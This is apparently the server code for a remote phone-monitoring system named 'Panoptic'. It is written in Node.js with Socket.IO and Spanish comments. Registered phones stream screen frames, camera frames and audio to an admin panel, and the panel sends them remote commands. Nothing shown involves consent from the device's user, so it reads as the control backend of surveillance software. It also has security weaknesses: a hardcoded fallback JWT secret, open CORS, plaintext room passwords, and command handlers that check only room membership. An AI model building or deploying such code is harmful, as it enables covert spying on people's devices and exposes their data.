const express = require('express');
const http = require('http');
const { Server } = require('socket.io');
const cors = require('cors');
const jwt = require('jsonwebtoken');
const db = require('./db');

const app = express();
app.use(cors({ origin: "*", methods: ["GET", "POST"] }));

const server = http.createServer(app);
const io = new Server(server, {
    cors: { origin: "*", methods: ["GET", "POST"] }
});

const JWT_SECRET = process.env.JWT_SECRET || 'clave_secreta_super_segura_mirror_dark';
const activeRooms = new Map();

io.on('connection', (socket) => {
    console.log(`[+] Conexión establecida: ${socket.id}`);

    // --- AUTENTICACIÓN Y REGISTRO ---
    socket.on('admin_login', ({ identifier, pass }) => {
        db.verifyAdmin(identifier, pass, (err, user) => {
            if (err || !user) {
                socket.emit('admin_login_error', { message: 'Credenciales inválidas.' });
            } else {
                const token = jwt.sign(
                    { id: user.id, username: user.username, correo: user.correo, nombre: user.nombre },
                    JWT_SECRET,
                    { expiresIn: '7d' }
                );
                socket.emit('admin_login_success', { message: 'Acceso autorizado', token, user: { username: user.username, correo: user.correo } });
            }
        });
    });

    socket.on('admin_register', ({ nombre, username, correo, pass }) => {
        db.registerAdmin(nombre, username, correo, pass, (err) => {
            if (err) {
                socket.emit('admin_register_error', { message: err.message });
            } else {
                socket.emit('admin_register_success', { message: 'Usuario registrado con éxito.' });
            }
        });
    });

    // --- ACTUALIZAR DATOS DE USUARIO (Username / Password) ---
    socket.on('update_user_profile', ({ token, newUsername, newPassword }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) {
                socket.emit('auth_error', { message: 'No autorizado' });
                return;
            }

            db.updateUser(decodedUser.id, newUsername, newPassword, (dbErr) => {
                if (dbErr) {
                    socket.emit('user_update_error', { message: 'Error al actualizar el usuario (el username ya podría estar en uso)' });
                } else {
                    const newToken = jwt.sign(
                        { id: decodedUser.id, username: newUsername, correo: decodedUser.correo, nombre: decodedUser.nombre },
                        JWT_SECRET,
                        { expiresIn: '7d' }
                    );
                    socket.emit('user_update_success', { message: 'Perfil actualizado con éxito', token: newToken });
                }
            });
        });
    });

    // --- ELIMINAR CUENTA DE USUARIO ---
    socket.on('delete_user_account', ({ token }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'No autorizado' });

            db.getRoomByUser(decodedUser.id, (__, roomData) => {
                if (roomData && activeRooms.has(roomData.room_code)) {
                    activeRooms.delete(roomData.room_code);
                }

                db.deleteUser(decodedUser.id, (dbErr) => {
                    if (dbErr) {
                        socket.emit('delete_account_error', { message: 'Error al eliminar la cuenta' });
                    } else {
                        socket.emit('delete_account_success', { message: 'Cuenta eliminada permanentemente' });
                    }
                });
            });
        });
    });

    // --- RESTAURAR SESIÓN ---
    socket.on('restore_user_session', ({ token }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'Token inválido' });

            db.getRoomByUser(decodedUser.id, (dbErr, roomData) => {
                if (dbErr || !roomData) {
                    socket.emit('no_active_room', { message: 'Sin sala activa' });
                    return;
                }

                const roomCode = roomData.room_code;
                if (!activeRooms.has(roomCode)) {
                    activeRooms.set(roomCode, { password: roomData.password, devices: new Map() });
                }

                const room = activeRooms.get(roomCode);
                socket.join(roomCode);
                socket.roomCode = roomCode;
                socket.isPanel = true;

                socket.emit('room_restored', {
                    roomCode: roomCode,
                    roomName: roomData.room_name,
                    password: roomData.password,
                    devices: Array.from(room.devices.values())
                });
            });
        });
    });

    // --- CREAR SALA ---
    socket.on('create_room', ({ token, roomName, password }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'No autorizado' });

            const roomCode = Math.random().toString(36).substring(2, 8).toUpperCase();

            db.saveRoomForUser(decodedUser.id, roomCode, roomName, password, (dbErr) => {
                if (dbErr) return socket.emit('room_error', { message: 'Error al registrar la sala' });

                if (!activeRooms.has(roomCode)) {
                    activeRooms.set(roomCode, { password, devices: new Map() });
                }

                socket.join(roomCode);
                socket.roomCode = roomCode;
                socket.isPanel = true;

                socket.emit('room_created', { roomCode, roomName, password });
                const room = activeRooms.get(roomCode);
                socket.emit('update_devices', Array.from(room.devices.values()));
            });
        });
    });

    // --- EDITAR SALA ---
    socket.on('update_room', ({ token, roomName, password }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'No autorizado' });

            db.updateRoom(decodedUser.id, roomName, password, (dbErr) => {
                if (dbErr) return socket.emit('room_error', { message: 'Error al actualizar la sala' });

                db.getRoomByUser(decodedUser.id, (_, roomData) => {
                    if (roomData && activeRooms.has(roomData.room_code)) {
                        const room = activeRooms.get(roomData.room_code);
                        room.password = password;
                    }
                    socket.emit('room_updated', { message: 'Sala actualizada con éxito', roomName, password });
                });
            });
        });
    });

    // --- ELIMINAR SALA ---
    socket.on('delete_room', ({ token }) => {
        jwt.verify(token, JWT_SECRET, (err, decodedUser) => {
            if (err) return socket.emit('auth_error', { message: 'No autorizado' });

            db.getRoomByUser(decodedUser.id, (_, roomData) => {
                if (roomData && activeRooms.has(roomData.room_code)) {
                    activeRooms.delete(roomData.room_code);
                }

                db.deleteRoomByUser(decodedUser.id, (dbErr) => {
                    if (dbErr) return socket.emit('room_error', { message: 'Error al eliminar la sala' });
                    socket.emit('room_deleted', { message: 'Sala eliminada con éxito' });
                });
            });
        });
    });

    // --- REGISTRO DE DISPOSITIVO MÓVIL ---
    socket.on('register_phone', (data) => {
        const { roomCode, password, name, propietario, battery } = data;

        db.getRoom(roomCode, (err, roomData) => {
            if (err || !roomData || roomData.password !== password) {
                socket.emit('auth_error', { message: 'Sala inexistente o contraseña incorrecta' });
                return;
            }

            if (!activeRooms.has(roomCode)) {
                activeRooms.set(roomCode, { password: roomData.password, devices: new Map() });
            }

            const room = activeRooms.get(roomCode);
            socket.join(roomCode);
            socket.roomCode = roomCode;
            socket.isPhone = true;

            const deviceInfo = {
                id: socket.id,
                name: name || `Dispositivo (${socket.id.substring(0, 4)})`,
                propietario: propietario || 'Desconocido',
                battery: battery !== undefined ? battery : 0,
                ip: socket.handshake.address
            };

            room.devices.set(socket.id, deviceInfo);
            db.upsertDevice(socket.id, deviceInfo.name, deviceInfo.propietario, roomCode, deviceInfo.battery);

            io.to(roomCode).emit('update_devices', Array.from(room.devices.values()));
        });
    });

    // --- ELIMINAR / EXPULSAR DISPOSITIVO ESPECÍFICO ---
    socket.on('kick_device', ({ targetId }) => {
        const roomCode = socket.roomCode;
        if (!roomCode || !activeRooms.has(roomCode)) return;

        const room = activeRooms.get(roomCode);
        if (room.devices.has(targetId)) {
            room.devices.delete(targetId);
            db.removeDevice(targetId);

            io.to(targetId).emit('kicked_from_room');
            io.to(roomCode).emit('update_devices', Array.from(room.devices.values()));
            console.log(`[-] Dispositivo expulsado de sala [${roomCode}]: ${targetId}`);
        }
    });

    // --- STREAMING Y COMANDOS ---
    socket.on('send_command_to_device', (data) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(data.targetId).emit('command_to_phone', { action: data.action, lens: data.lens || 'back' });
    });

    socket.on('phone_response', (response) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('phone_response', { ...response, deviceId: socket.id });
    });

    socket.on('screen_frame', (base64Frame) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('screen_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('camera_frame', (base64Frame) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('camera_frame', { deviceId: socket.id, frame: base64Frame });
    });

    socket.on('audio_chunk', (base64Audio) => {
        const roomCode = socket.roomCode;
        if (!roomCode) return;
        io.to(roomCode).emit('audio_chunk', { deviceId: socket.id, chunk: base64Audio });
    });

    // --- DESCONEXIÓN CON LOG DETALLADO ---
    socket.on('disconnect', (reason) => {
        console.log(`[-] Desconectado (${reason}): ${socket.id}`);

        const roomCode = socket.roomCode;
        if (roomCode && activeRooms.has(roomCode)) {
            const room = activeRooms.get(roomCode);
            if (room.devices.has(socket.id)) {
                room.devices.delete(socket.id);
                db.removeDevice(socket.id);
                io.to(roomCode).emit('update_devices', Array.from(room.devices.values()));
            }
        }
    });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, '0.0.0.0', () => {
    console.log(`Servidor Panoptic Multi-Tenant listo en el puerto ${PORT}`);
});